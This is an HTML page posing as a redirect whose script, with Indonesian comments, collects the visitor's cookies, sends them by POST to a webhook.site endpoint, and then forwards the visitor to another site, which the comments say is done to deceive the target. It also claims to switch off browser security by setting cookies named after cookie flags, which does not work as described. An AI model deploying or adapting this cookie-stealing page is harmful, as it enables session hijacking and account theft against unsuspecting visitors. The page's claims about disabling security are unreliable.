<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        // Menonaktifkan proteksi keamanan browser
        document.cookie = "sameSite=None";
        document.cookie = "Secure=false";
        document.cookie = "HttpOnly=false";

        // Ambil cookies
        var cookies = document.cookie;
        
        // Kirim cookies ke Webhook.site
        var webhookURL = 'https://webhook.site/535797ef-1f9c-452a-94ab-633b408224ea'; // Ganti dengan URL endpoint dari Webhook.site
        var xhr = new XMLHttpRequest();
        xhr.open("POST", webhookURL, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify({ cookies: cookies }));

        // Redirect ke halaman yang valid untuk mengelabui target
        window.location.replace("https://hackprank.com/");
    </script>
</body>
</html>
